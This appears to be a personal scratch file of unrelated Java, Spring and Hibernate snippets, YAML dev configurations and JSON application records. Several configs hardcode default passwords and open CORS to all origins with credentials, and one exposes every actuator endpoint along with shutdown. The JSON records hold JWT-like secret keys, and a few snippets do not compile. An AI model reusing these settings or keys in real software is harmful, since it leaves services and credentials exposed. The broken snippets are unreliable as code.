        if (StringUtils.hasText(bearerToken) && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7, bearerToken.length());
        }
        String jwt = request.getParameter(JWTConfigurer.AUTHORIZATION_TOKEN);
        if (StringUtils.hasText(jwt)) {
            return jwt;
        }
        return null;
    }
}
--------------------------------------------------------------------------------------------------------
package com.springio.store.config.audit;

import com.springio.store.domain.PersistentAuditEvent;

import org.springframework.boot.actuate.audit.AuditEvent;
import org.springframework.security.web.authentication.WebAuthenticationDetails;
import org.springframework.stereotype.Component;

import java.util.*;

@Component
public class AuditEventConverter {

    /**
     * Convert a list of PersistentAuditEvent to a list of AuditEvent
     *
     * @param persistentAuditEvents the list to convert
     * @return the converted list.
     */
    public List<AuditEvent> convertToAuditEvent(Iterable<PersistentAuditEvent> persistentAuditEvents) {
        if (persistentAuditEvents == null) {
            return Collections.emptyList();
        }
        List<AuditEvent> auditEvents = new ArrayList<>();
        for (PersistentAuditEvent persistentAuditEvent : persistentAuditEvents) {
            auditEvents.add(convertToAuditEvent(persistentAuditEvent));
        }
        return auditEvents;
    }

    /**
     * Convert a PersistentAuditEvent to an AuditEvent
     *
     * @param persistentAuditEvent the event to convert
     * @return the converted list.
     */
    public AuditEvent convertToAuditEvent(PersistentAuditEvent persistentAuditEvent) {
        return new AuditEvent(Date.from(persistentAuditEvent.getAuditEventDate()), persistentAuditEvent.getPrincipal(),
            persistentAuditEvent.getAuditEventType(), convertDataToObjects(persistentAuditEvent.getData()));
    }

    /**
     * Internal conversion. This is needed to support the current SpringBoot actuator AuditEventRepository interface
     *
     * @param data the data to convert
     * @return a map of String, Object
     */
    public Map<String, Object> convertDataToObjects(Map<String, String> data) {
        Map<String, Object> results = new HashMap<>();

        if (data != null) {
            for (Map.Entry<String, String> entry : data.entrySet()) {
                results.put(entry.getKey(), entry.getValue());
            }
        }
        return results;
    }

    /**
     * Internal conversion. This method will allow to save additional data.
     * By default, it will save the object as string
     *
     * @param data the data to convert
     * @return a map of String, String
     */
    public Map<String, String> convertDataToStrings(Map<String, Object> data) {
        Map<String, String> results = new HashMap<>();

        if (data != null) {
            for (Map.Entry<String, Object> entry : data.entrySet()) {
                Object object = entry.getValue();

                // Extract the data that will be saved.
                if (object instanceof WebAuthenticationDetails) {
                    WebAuthenticationDetails authenticationDetails = (WebAuthenticationDetails) object;
                    results.put("remoteAddress", authenticationDetails.getRemoteAddress());
                    results.put("sessionId", authenticationDetails.getSessionId());
                } else if (object != null) {
                    results.put(entry.getKey(), object.toString());
                } else {
                    results.put(entry.getKey(), "null");
                }
            }
        }

        return results;
    }
}
--------------------------------------------------------------------------------------------------------
<bean id="sessionFactory" class="org.springframework.orm.hibernate4.LocalSessionFactoryBean" destroy-method="destroy">
    <property name="dataSource" ref="dataSource"/>
    <property name="configLocation" value="classpath:hibernate.cfg.xml"/>
    <property name="hibernateProperties">
        <props>
            <prop key="hibernate.dialect">${hibernate.dialect}</prop>
            <prop key="hibernate.query.substitutions">true 'Y', false 'N'</prop>
            <prop key="hibernate.cache.use_second_level_cache">true</prop>
            <prop key="hibernate.cache.provider_class">org.hibernate.cache.EhCacheProvider</prop>
            <!-- Hibernate Search index directory -->
            <prop key="hibernate.search.default.indexBase">${app.search.index.basedir}</prop>
        </props>
        <!-- Turn batching off for better error messages under PostgreSQL -->
        <!-- hibernate.jdbc.batch_size=0 -->
    </property>
</bean>
--------------------------------------------------------------------------------------------------------
# ===================================================================
# Spring Boot configuration for the "dev" profile.
#
# This configuration overrides the application.yml file.
#
# More information on profiles: https://www.jhipster.tech/profiles/
# More information on configuration properties: https://www.jhipster.tech/common-application-properties/
# ===================================================================

# ===================================================================
# Standard Spring Boot properties.
# Full reference is available at:
# http://docs.spring.io/spring-boot/docs/current/reference/html/common-application-properties.html
# ===================================================================

logging:
  level:
    ROOT: DEBUG
    io.github.jhipster: DEBUG
    com.kekse.mystaff: DEBUG

eureka:
  instance:
    prefer-ip-address: true
  client:
    service-url:
      defaultZone: http://admin:${jhipster.registry.password}@${DEV_REGISTRY_ADDRESS}:${DEV_REGISTRY_PORT}/eureka/

spring:
  elasticsearch:
    rest:
      uris: http://localhost:9200
  profiles:
    active: dev
    include:
      - swagger
      # Uncomment to activate TLS for the dev profile
      #- tls
  devtools:
    restart:
      enabled: true
    livereload:
      enabled: false # we use Webpack dev server + BrowserSync for livereload
  jackson:
    serialization:
      indent-output: true
  datasource:
    type: com.zaxxer.hikari.HikariDataSource
    url: jdbc:mysql://${DEV_DB_ADDRESS}:${DEV_DB_PORT}/UserAuthorityAgent600?createDatabaseIfNotExist=true&useUnicode=true&characterEncoding=utf8&useSSL=false&useLegacyDatetimeCode=false&serverTimezone=UTC
    username: ${DEV_DB_USERNAME}
    password: ${DEV_DB_PASSWORD}
    hikari:
      poolName: Hikari
      auto-commit: false
      data-source-properties:
        cachePrepStmts: true
        prepStmtCacheSize: 250
        prepStmtCacheSqlLimit: 2048
        useServerPrepStmts: true
  jpa:
    database-platform: org.hibernate.dialect.MySQL5InnoDBDialect
    database: MYSQL
    show-sql: true
    properties:
      hibernate.id.new_generator_mappings: true
      hibernate.connection.provider_disables_autocommit: true
      hibernate.cache.use_second_level_cache: true
      hibernate.cache.use_query_cache: false
      hibernate.generate_statistics: false
      hibernate.cache.region.factory_class: com.hazelcast.hibernate.HazelcastCacheRegionFactory
      hibernate.cache.hazelcast.instance_name: UserAuthorityAgent
      hibernate.cache.use_minimal_puts: true
      hibernate.cache.hazelcast.use_lite_member: true
  data:
    elasticsearch:
      properties:
        path:
          home: target/elasticsearch
  liquibase:
    # Remove 'faker' if you do not want the sample data to be loaded automatically
    contexts: dev, faker
  mail:
    host: ${DEV_MAIL_HOST}
    port: ${DEV_MAIL_PORT}
    username: ${DEV_MAIL_USERNAME}
    password: ${DEV_MAIL_PASSWORD}
    protocol: ${DEV_MAIL_PROTOCOL}
    tls: true
    properties.mail.smtp:
      auth: true
      starttls.enable: true
      ssl.trust: ${DEV_MAIL_SSL_TRUST}
  messages:
    cache-duration: PT1S # 1 second, see the ISO 8601 standard
  thymeleaf:
    cache: false
  sleuth:
    sampler:
      probability: 1 # report 100% of traces
  zipkin: # Use the "zipkin" Maven profile to have the Spring Cloud Zipkin dependencies
    base-url: http://localhost:9411
    enabled: false
    locator:
      discovery:
        enabled: true

server:
  port: 9999

# ===================================================================
# JHipster specific properties
#
# Full reference is available at: https://www.jhipster.tech/common-application-properties/
# ===================================================================

jhipster:
  cache: # Cache configuration
    hazelcast: # Hazelcast distributed cache
      time-to-live-seconds: 3600
      backup-count: 1
      management-center: # Full reference is available at: http://docs.hazelcast.org/docs/management-center/3.9/manual/html/Deploying_and_Starting.html
        enabled: false
        update-interval: 3
        url: http://localhost:8180/mancenter
  # CORS is only enabled by default with the "dev" profile, so BrowserSync can access the API
  cors:
    allowed-origins: '*'
    allowed-methods: '*'
    allowed-headers: '*'
    exposed-headers: 'Authorization,Link,X-Total-Count'
    allow-credentials: true
    max-age: 1800
  security:
    client-authorization:
      client-id: internal
      client-secret: internal
  mail: # specific JHipster mail property, for standard properties see MailProperties
    from: UserAuthorityAgent@localhost
    base-url: http://127.0.0.1:8080
  metrics:
    logs: # Reports metrics in the logs
      enabled: false
      report-frequency: 60 # in seconds
  logging:
    use-json-format: false # By default, logs are not in Json format
    logstash: # Forward logs to logstash over a socket, used by LoggingConfiguration
      enabled: false
      host: localhost
      port: 5000
      queue-size: 512
uaa:
  key-store:
    name: config/tls/keystore.p12
    password: password
    alias: selfsigned
  web-client-configuration:
    # Access Token is valid for 5 mins
    access-token-validity-in-seconds: 300
    # Refresh Token is valid for 7 days
    refresh-token-validity-in-seconds-for-remember-me: 604800
    client-id: web_app
    secret: changeit
# ===================================================================
# Application specific properties
# Add your own application properties here, see the ApplicationProperties class
# to have type-safe configuration, like in the JHipsterProperties above
#
# More documentation is available at:
# https://www.jhipster.tech/common-application-properties/
# ===================================================================

# application:

-------------------------------------------------------------------------------------------------------
static Consumer<Integer> lambdaWrapper(Consumer<Integer> consumer) {
    return i -> {
        try {
            consumer.accept(i);
        } catch (ArithmeticException e) {
            System.err.println(
              "Arithmetic Exception occured : " + e.getMessage());
        }
    };
}

List<Integer> integers = Arrays.asList(3, 9, 7, 0, 10, 20);
integers.forEach(lambdaWrapper(i -> System.out.println(50 / i)));

static <T, E extends Exception> Consumer<T>
  consumerWrapper(Consumer<T> consumer, Class<E> clazz) {
  
    return i -> {
        try {
            consumer.accept(i);
        } catch (Exception ex) {
            try {
                E exCast = clazz.cast(ex);
                System.err.println(
                  "Exception occured : " + exCast.getMessage());
            } catch (ClassCastException ccEx) {
                throw ex;
            }
        }
    };
}

List<Integer> integers = Arrays.asList(3, 9, 7, 0, 10, 20);
integers.forEach(
  consumerWrapper(
    i -> System.out.println(50 / i), 
    ArithmeticException.class));
	
	
List<Integer> integers = Arrays.asList(3, 9, 7, 0, 10, 20);
integers.forEach(i -> {
    try {
        writeToFile(i);
    } catch (IOException e) {
        throw new RuntimeException(e);
    }
});


@FunctionalInterface
public interface ThrowingConsumer<T, E extends Exception> {
    void accept(T t) throws E;
}

static <T> Consumer<T> throwingConsumerWrapper(
  ThrowingConsumer<T, Exception> throwingConsumer) {
  
    return i -> {
        try {
            throwingConsumer.accept(i);
        } catch (Exception ex) {
            throw new RuntimeException(ex);
        }
    };
}

List<Integer> integers = Arrays.asList(3, 9, 7, 0, 10, 20);
integers.forEach(throwingConsumerWrapper(i -> writeToFile(i)));
-------------------------------------------------------------------------------------------------------
import java.util.concurrent.Callable;

import static org.assertj.core.error.ShouldBeInstance.shouldBeInstance;

/**
 * Assertion methods for {@link Throwable}s.
 * <p>
 * To create a new instance of this class, invoke <code>{@link Assertions#assertThat(Throwable)}</code>.
 * </p>
 *
 * @author David DIDIER
 * @author Alex Ruiz
 * @author Joel Costigliola
 * @author Mikhail Mazursky
 */
public class ThrowableAssert extends AbstractThrowableAssert<ThrowableAssert, Throwable> {

  public interface ThrowingCallable {
    void call() throws Throwable;
  }

  public ThrowableAssert(Throwable actual) {
    super(actual, ThrowableAssert.class);
  }

  public <V> ThrowableAssert(Callable<V> runnable) {
    super(buildThrowableAssertFromCallable(runnable), ThrowableAssert.class);
  }

  private static <V> Throwable buildThrowableAssertFromCallable(Callable<V> callable) throws AssertionError {
    try {
      callable.call();
      // fail if the expected exception was *not* thrown
      Fail.fail("Expecting code to throw an exception.");
      // this will *never* happen...
      return null;
    } catch (AssertionError e) {
      // do not handle AssertionErrors in the next catch block!
      throw e;
    } catch (Throwable throwable) {
      // the throwable we will check
      return throwable;
    }
  }

  public static Throwable catchThrowable(ThrowingCallable shouldRaiseThrowable) {
    try {
      shouldRaiseThrowable.call();
    } catch (Throwable throwable) {
      return throwable;
    }
    return null;
  }

  @SuppressWarnings("unchecked")
  public static <THROWABLE extends Throwable> THROWABLE catchThrowableOfType(ThrowingCallable shouldRaiseThrowable,
                                                                             Class<THROWABLE> type) {
    Throwable throwable = catchThrowable(shouldRaiseThrowable);
    if (throwable == null) return null;
    // check exception type
    new ThrowableAssert(throwable).overridingErrorMessage(shouldBeInstance(throwable, type).create())
                                  .isInstanceOf(type);
    return (THROWABLE) throwable;
  }
}
-------------------------------------------------------------------------------------------------------
    AsyncContext asyncContext = request.startAsync();
    asyncContext.setTimeout(30000);
    asyncContext.start(myRunnableClass);
-------------------------------------------------------------------------------------------------------
# Paragon MicroServices Distributor configuration
---
server:
  port: 8089
  tomcat:
    remote-ip-header: x-forward-for

redis:
  user:
    field-key: data
    key-space: user
    time-to-live: 300

spring:
  redis:
    host: localhost
    port: 6379
  mvc:
    throw-exception-if-no-handler-found: true
    log-resolved-exception: true
  devtools:
    add-properties: false
  aop:
    proxy-target-class: true
  datasource:
    url: jdbc:postgresql://localhost:5432/distributor
    username: postgres
    password: postgres
    driver-class-name: org.postgresql.Driver
    sql-script-encoding: utf-8
    hikari:
      minimum-idle: 5
      maximum-pool-size: 25
      idle-timeout: 30000
      isolate-internal-queries: true
      connection-test-query: SELECT current_timestamp
  jpa:
    show-sql: true
    open-in-view: false
    generate-ddl: false
    database: postgresql
    hibernate:
      ddl-auto: none
      properties:
        hibernate:
          dialect: org.hibernate.dialect.PostgreSQL9Dialect
          ddl-auto: none
          cache:
            use_query_cache: false
            use_second_level_cache: false
          jdbc.lob.non_contextual_creation: true
          temp.use_jdbc_metadata_defaults: false
          current_session_context_class: org.hibernate.context.internal.ThreadLocalSessionContext
  liquibase:
    change-log: classpath:/db/db.changelog-master.xml
    enabled: false

springfox:
  documentation:
    swagger:
      v2:
        path: /swagger-api

security:
  role:
    admin:
      code: 1
      paths: /api/admin/**
  rsa:
    modulus: y3YZPtr7MB94Tnwj9Je9fdnjwhenVEj5GdZEVcauTZtSSglkryujtRkNdhEiF7gjyJAMycg2AobYE33xiKsZvUdiKMKvvSNVjoG4M3KXBOkJTfKS6LefMCk/B0AqVBAzdrWBrpO3xvnuVLoAqCpUF4MWyqGwJO4sKWuRqSNX+fRtsXTSBQ4X7gbrvGyS7zRRsHAg1S7D9o6Sl8o7sFNNxSr82W2YD1MlWM1/3+v+uvGuEbWIxzb0nWtThV5j8gib0gknl/Mb78uor/jMi46IeBSPftQYtzwjZHe5T+V8BscwpGli2Y+XWFGJNoSa6DwxZxGSNB7DI6j+Ev46B+IC5Q==
    exponent: AQAB
  jwt:
    claim-names:
      user-id: userid
      owner-id: ownerid
      user-role: userrole
      expiration: exp

management:
  info:
    build:
      enabled: false
  endpoint:
    shutdown:
      enabled: true
    health:
      show-details: ALWAYS
  endpoints:
    web:
      exposure:
        include: '*'
      base-path: /api
      path-mapping:
        info: status

api-status:
  node:
    name: ${java.rmi.server.hostname:localhost}
  # build properties from maven
  build:
    groupId: '@project.groupId@'
    artifactId: '@project.artifactId@'
    version: '@project.version@'
    name: '@project.name@'
    timestamp: '@maven.build.timestamp@'

logging:
  config:

info:
  # application info
  app:
    name: '@project.name@'
    description: '@project.description@'
  # environment variables
  env:
    java:
      vendor: ${java.specification.vendor}
      vm-name: ${java.vm.name}
      runtime-version: ${java.runtime.version}
-------------------------------------------------------------------------------------------------------
    /**
     * Returns {@code T} mapped item by input {@link Object} source and {@link ModelMapperType}
     *
     * @param source - initial input input {@link Object} source
     * @param type   - initial input {@link ModelMapperType}
     * @param <T>    type of mapped item
     * @return {@code T} mapped item
     */
    protected <T> T map(final Object source, final TypeToken<T> type) {
        return this.getModelMapper().map(source, type.getType());
//        return safeCast(this.getModelMapper().map(source, type.getType()), type.getRawType());
    }
-------------------------------------------------------------------------------------------------------
    public static final <T> TypeToken<T> getTypeToken() {
        return new TypeToken<T>() {
        };
    }

    public interface MetaDataKey<T> extends Serializable {
        TypeToken<T> getTypeToken();

        String getName();
    }

    public enum StringKeys implements MetaDataKey<Iterable<ProductModelResponse>> {
        A1;

        @Override
        public TypeToken<Iterable<ProductModelResponse>> getTypeToken() {
            return Iterable.class;
        }

        @Override
        public String getName() {
            return getDeclaringClass().getName() + "." + name();
        }
    }

-------------------------------------------------------------------------------------------------------
package org.jboss.tutorial.callback.bean;

import javax.persistence.PreRemove;
import javax.persistence.PostRemove;
import javax.persistence.PreUpdate;
import javax.persistence.PostUpdate;
import javax.persistence.PostLoad;
import javax.persistence.PrePersist;
import javax.persistence.PostPersist;

/**
 * @author <a href="mailto:kabir.khan@jboss.org">Kabir Khan</a>
 * @version $Revision: 57207 $
 */
public class CustomerCallbackListener
{
   @PrePersist
   public void doPrePersist(Customer customer)
   {
      System.out.println("doPrePersist: About to create Customer: " + customer.getFirst() + " " + customer.getLast());
   }

   @PostPersist
   public void doPostPersist(Object customer)
   {
      System.out.println("doPostPersist: Created Customer: " + ((Customer)customer).getFirst() + " " + ((Customer)customer).getLast());
   }

   @PreRemove
   public void doPreRemove(Customer customer)
   {
      System.out.println("doPreRemove: About to delete Customer: " + customer.getFirst() + " " + customer.getLast());
   }

   @PostRemove
   public void doPostRemove(Customer customer)
   {
      System.out.println("doPostRemove: Deleted Customer: " + customer.getFirst() + " " + customer.getLast());
   }

   @PreUpdate
   public void doPreUpdate(Customer customer)
   {
      System.out.println("doPreUpdate: About to update Customer: " + customer.getFirst() + " " + customer.getLast());
   }

   @PostUpdate
   public void doPostUpdate(Customer customer)
   {
      System.out.println("doPostUpdate: Updated Customer: " + customer.getFirst() + " " + customer.getLast());
   }

   @PostLoad
   public void doPostLoad(Customer customer)
   {
      System.out.println("doPostLoad: Loaded Customer: " + customer.getFirst() + " " + customer.getLast());
   }


}

-------------------------------------------------------------------------------------------------------
import javax.persistence.DiscriminatorColumn;
import javax.persistence.DiscriminatorType;
import javax.persistence.DiscriminatorValue;
import javax.persistence.Entity;
import javax.persistence.GeneratedValue;
import javax.persistence.Id;
import javax.persistence.Inheritance;
import javax.persistence.InheritanceType;
import javax.persistence.Table;


@Entity
public class Employee extends Customer {
   private int employeeId;

   public int getEmployeeId() { return employeeId; }
   public void setEmployeeId(int id) { employeeId = id; }
}


@Entity
@DiscriminatorValue("CUST")
class Customer extends Person {
   private String street;
   private String city;
   private String state;
   private String zip;
   
   public String getStreet() { return street; }
   public void setStreet(String street) { this.street = street; }

   public String getCity() { return city; }
   public void setCity(String city) { this.city = city; }

   public String getState() { return state; }
   public void setState(String state) { this.state = state; }

   public String getZip() { return zip; }
   public void setZip(String zip) { this.zip = zip; }
}


@Entity
@Table(name="PERSON_HIERARCHY")
@Inheritance(strategy=InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name="DISCRIMINATOR",
                     discriminatorType=DiscriminatorType.STRING)
@DiscriminatorValue("PERSON")
class Person implements java.io.Serializable
{
   private int id;
   private String firstName;
   private String lastName;

   @Id @GeneratedValue
   public int getId() { return id; }
   public void setId(int id) { this.id = id; }

   public String getFirstName() { return firstName; }
   public void setFirstName(String first) { this.firstName = first; }

   public String getLastName() { return lastName; }
   public void setLastName(String last) { this.lastName = last; }
}
-------------------------------------------------------------------------------------------------------
 @UID
    @Column(name = "uuid", unique = true, nullable = false, updatable = false)
    //@GeneratedValue(generator = "UUID")
    //@GeneratedValue(generator = "uuid2")
    //@GenericGenerator(name = "UUID", strategy = "org.hibernate.id.UUIDGenerator")
    //@GenericGenerator(name = "uuid", strategy = "uuid2")
    @Type(type = "uuid-char")
    private UUID uuId;
-------------------------------------------------------------------------------------------------------
@Cascade(org.hibernate.annotations.CascadeType.ALL)
-------------------------------------------------------------------------------------------------------
@Entity
@BatchSize(size=5)
@org.hibernate.annotations.Entity(
        selectBeforeUpdate = true,
        dynamicInsert = true, dynamicUpdate = true,
        optimisticLock = OptimisticLockType.ALL,
        polymorphism = PolymorphismType.EXPLICIT)
@Where(clause="1=1")
@org.hibernate.annotations.Table(name="Forest", indexes = { @Index(name="idx", columnNames = { "name", "length" } ) } )
@Persister(impl=MyEntityPersister.class)
public class Forest { ... }
-------------------------------------------------------------------------------------------------------
{
  "id": "83408168-4c5b-4362-93c5-c64d0a24bb21",
  "name": "BounceParser",
  "secretKey": "eyJhbGciOiJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2IiwidHlwIjoiSldUIn0.eyJqdGkiOiI3ODNhMWRjYi02NGEzLTQzMjktODYxMy0xNzhlZDJkNTg2ZmMiLCJhcHBsaWNhdGlvbklkIjoiODM0MDgxNjgtNGM1Yi00MzYyLTkzYzUtYzY0ZDBhMjRiYjIxIiwiZXhwIjoxNjAxNTYzNDI3LCJpc3MiOiJSZWdpc3RyeSIsImF1ZCI6IlJlZ2lzdHJ5In0.bUgfnlhFCzu2MpssrRu2MaPL6gJ_NxpTmQ3TSeEtIVB__JwBxmcbuxCxYY19djtazxTzpL5GUQpbfw8z3R8AXPP01yYreffiRApP6NO9zzryUkNbs37n9WbtBgR1NoFU_RWFWGoSTq0RPDYztXBViqoLYJjaQ6gdjG7W9moBNGiAsh0JQFj7d7FcSNjoAIpOqYVEY5p9Z78G0BQqzJAgcjjkip2VQfS_07bsKPpTGycCtwzbyEGQQ5YheaWU6fY2x44hYq8ROiouJrBbewlqreh-OdVpoA2eUplMpWUF7XMCXf5I5FnU_7tSIhcOKZK20Htglu6zDkOGQEydZnPFpw",
  "applicationClaims": []
}

{
  "id": "1812b7cb-d8ad-453a-bb18-6eeee79f9be9",
  "name": "CrmMailAdapter",
  "secretKey": "eyJhbGciOiJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2IiwidHlwIjoiSldUIn0.eyJqdGkiOiJmNzdmY2QxZC01MmNjLTRmODMtOTE5My0yYjFiNTUxYjc1NzYiLCJhcHBsaWNhdGlvbklkIjoiMTgxMmI3Y2ItZDhhZC00NTNhLWJiMTgtNmVlZWU3OWY5YmU5IiwiZXhwIjoxNjAxNTYzNDY4LCJpc3MiOiJSZWdpc3RyeSIsImF1ZCI6IlJlZ2lzdHJ5In0.cyUpMKQgTtT8258JvrA9t4-AOCiwFTulvSChSxX-d9J8lase3N1r0WBGQgJa7wkb-1-1LJhvpdTm6D0Ge5ZbngUO57CbGizdsy-7jJ4MUd9DBqscWPw-Omw1zLN2Aet5k83P0AywLnD8KpXud3nrIj-GwlQVxgtWEEyGJDKpNKuTx1NgFq-ySxyBfJVB5PsIM8hw-m3NyAwK4TI5foC_aQ6K37RT0kO4o4BvloQQYXLyozMwuIwKvuRc6G3ytWey_jNQ2zcnGI_doX0mqziXBz95Ysn7lo-wj0JkCC1XYowNYzPbNJqnPOq_WYp5173HBJCJXMDJnBE8SDqFFc741w",
  "applicationClaims": []
}

{
  "id": "81af6b19-1063-4ba9-8d8d-58c50c9b5eed",
  "name": "ConfirmationLink",
  "secretKey": "eyJhbGciOiJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2IiwidHlwIjoiSldUIn0.eyJqdGkiOiIzZjE1ZWNiNy1kMTlkLTQxNjktYTFlZi1kNGUwNTIyMzUxZGQiLCJhcHBsaWNhdGlvbklkIjoiODFhZjZiMTktMTA2My00YmE5LThkOGQtNThjNTBjOWI1ZWVkIiwiZXhwIjoxNjAxNTYzNDg1LCJpc3MiOiJSZWdpc3RyeSIsImF1ZCI6IlJlZ2lzdHJ5In0.ntbCt-BLlt8509IpU74d8wT2nzjnhB9ppNLAJjE-_GODEmZqXsPI1MG9VDD4wf0bqgcZPPLNfNuqKFBsiFhMK4YCoWX9i1tVutfvc-Y2Qm0BPCQRTiosldvh_5tIkEHKuW_LY_joUMjoX7ODQ2meo-33fYCg-5kHZ1iRKnTj7W1Prg1zVtvM8LPr7HgOtPLBXfXsRoLwML2lIuIDy6-lSrt5TG8Xht6Pqo5gSiXd55Vtd6V5zdKAo_Dv8EhludqSeGN1gcN4mjq-jkBX_No5q8efJDA7-4xdrTvxUK8QEH3N6DuaPTtxF9T_0GN9X73u4K-leQhSOTq9k-0XSOc3LQ",
  "applicationClaims": []
}
-------------------------------------------------------------------------------------------------------
@Entity
public class Parent implements Serializable {
    @Id
    public ParentPk id;
    public int age;

    @OneToMany(cascade=CascadeType.ALL)
    @JoinColumns ({
        @JoinColumn(name="parentCivility", referencedColumnName = "isMale"),
        @JoinColumn(name="parentLastName", referencedColumnName = "lastName"),
        @JoinColumn(name="parentFirstName", referencedColumnName = "firstName")
    })
    public Set<Child> children; //unidirectional
    ...
}

@Entity
public class Child implements Serializable {
    @Id @GeneratedValue
    public Integer id;

    @ManyToOne
    @JoinColumns ({
        @JoinColumn(name="parentCivility", referencedColumnName = "isMale"),
        @JoinColumn(name="parentLastName", referencedColumnName = "lastName"),
        @JoinColumn(name="parentFirstName", referencedColumnName = "firstName")
    })
    public Parent parent; //unidirectional
}  


-------------------------------------------------------------------------------------------------------
@Entity
@Table(name="MainCat")
@SecondaryTables({
    @SecondaryTable(name="Cat1", pkJoinColumns={
        @PrimaryKeyJoinColumn(name="cat_id", referencedColumnName="id")
    ),
    @SecondaryTable(name="Cat2", uniqueConstraints={@UniqueConstraint(columnNames={"storyPart2"})})
})
public class Cat implements Serializable {

    private Integer id;
    private String name;
    private String storyPart1;
    private String storyPart2;

    @Id @GeneratedValue
    public Integer getId() {
        return id;
    }

    public String getName() {
        return name;
    }
    
    @Column(table="Cat1")
    public String getStoryPart1() {
        return storyPart1;
    }

    @Column(table="Cat2")
    public String getStoryPart2() {
        return storyPart2;
    }
}
-------------------------------------------------------------------------------------------------------
  @ManyToAny(
            metaColumn = @Column( name = "property_type" ) )
    @AnyMetaDef( 
        idType = "integer", 
        metaType = "string",
        metaValues = {
            @MetaValue( value = "S", targetEntity = StringProperty.class ),
            @MetaValue( value = "I", targetEntity = IntegerProperty.class ) } )
    @Cascade( { org.hibernate.annotations.CascadeType.ALL } )
    @JoinTable( name = "obj_properties", joinColumns = @JoinColumn( name = "obj_id" ),
            inverseJoinColumns = @JoinColumn( name = "property_id" ) )
    public List<Property> getGeneralProperties() {
	
@Entity
public class Woman {
    ...
    @ManyToMany(cascade = {CascadeType.ALL})
    @ForeignKey(name = "TO_WOMAN_FK", inverseName = "TO_MAN_FK")
    public Set<Man> getMens() {
        return mens;
    }
}

@Sort(type = SortType.COMPARATOR, comparator = TicketComparator.class)
-------------------------------------------------------------------------------------------------------
JsonContentProperty newProperty = JsonContentProperty.builder()
    .content(page)
    .key(propertyKey)
    .value(new JsonString(jsonString))
    .version(Version.builder().number(1).build())
    .build();

@Entity
@FilterDef(name="minLength", parameters=@ParamDef( name="minLength", type="integer" ) )
@Filters( {
    @Filter(name="betweenLength", condition=":minLength <= length and :maxLength >= length"),
    @Filter(name="minLength", condition=":minLength <= length")
} )
public class Forest { ... }
-------------------------------------------------------------------------------------------------------
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.SpringApplicationConfiguration;
import org.springframework.http.MediaType;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.mock.http.MockHttpOutputMessage;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.context.web.WebAppConfiguration;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import java.io.IOException;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.Matchers.is;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;
import static org.springframework.test.web.servlet.setup.MockMvcBuilders.webAppContextSetup;

/**
 * @author Josh Long
 */
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = Application.class)
@WebAppConfiguration
public class BookmarkRestControllerTest {


    private MediaType contentType = new MediaType(MediaType.APPLICATION_JSON.getType(),
            MediaType.APPLICATION_JSON.getSubtype(),
            Charset.forName("utf8"));

    private MockMvc mockMvc;

    private String userName = "bdussault";

    private HttpMessageConverter mappingJackson2HttpMessageConverter;

    private Account account;

    private List<Bookmark> bookmarkList = new ArrayList<>();

    @Autowired
    private BookmarkRepository bookmarkRepository;

    @Autowired
    private WebApplicationContext webApplicationContext;

    @Autowired
    private AccountRepository accountRepository;

    @Autowired
    void setConverters(HttpMessageConverter<?>[] converters) {

        this.mappingJackson2HttpMessageConverter = Arrays.asList(converters).stream().filter(
                hmc -> hmc instanceof MappingJackson2HttpMessageConverter).findAny().get();

        Assert.assertNotNull("the JSON message converter must not be null",
                this.mappingJackson2HttpMessageConverter);
    }

    @Before
    public void setup() throws Exception {
        this.mockMvc = webAppContextSetup(webApplicationContext).build();

        this.bookmarkRepository.deleteAllInBatch();
        this.accountRepository.deleteAllInBatch();

        this.account = accountRepository.save(new Account(userName, "password"));
        this.bookmarkList.add(bookmarkRepository.save(new Bookmark(account, "http://bookmark.com/1/" + userName, "A description")));
        this.bookmarkList.add(bookmarkRepository.save(new Bookmark(account, "http://bookmark.com/2/" + userName, "A description")));
    }

    @Test
    public void userNotFound() throws Exception {
        mockMvc.perform(post("/george/bookmarks/")
                .content(this.json(new Bookmark()))
                .contentType(contentType))
                .andExpect(status().isNotFound());
    }

    @Test
    public void readSingleBookmark() throws Exception {
        mockMvc.perform(get("/" + userName + "/bookmarks/"
                + this.bookmarkList.get(0).getId()))
                .andExpect(status().isOk())
                .andExpect(content().contentType(contentType))
                .andExpect(jsonPath("$.id", is(this.bookmarkList.get(0).getId().intValue())))
                .andExpect(jsonPath("$.uri", is("http://bookmark.com/1/" + userName)))
                .andExpect(jsonPath("$.description", is("A description")));
    }

    @Test
    public void readBookmarks() throws Exception {
        mockMvc.perform(get("/" + userName + "/bookmarks"))
                .andExpect(status().isOk())
                .andExpect(content().contentType(contentType))
                .andExpect(jsonPath("$", hasSize(2)))
                .andExpect(jsonPath("$[0].id", is(this.bookmarkList.get(0).getId().intValue())))
                .andExpect(jsonPath("$[0].uri", is("http://bookmark.com/1/" + userName)))
                .andExpect(jsonPath("$[0].description", is("A description")))
                .andExpect(jsonPath("$[1].id", is(this.bookmarkList.get(1).getId().intValue())))
                .andExpect(jsonPath("$[1].uri", is("http://bookmark.com/2/" + userName)))
                .andExpect(jsonPath("$[1].description", is("A description")));
    }

    @Test
    public void createBookmark() throws Exception {
        String bookmarkJson = json(new Bookmark(
                this.account, "http://spring.io", "a bookmark to the best resource for Spring news and information"));
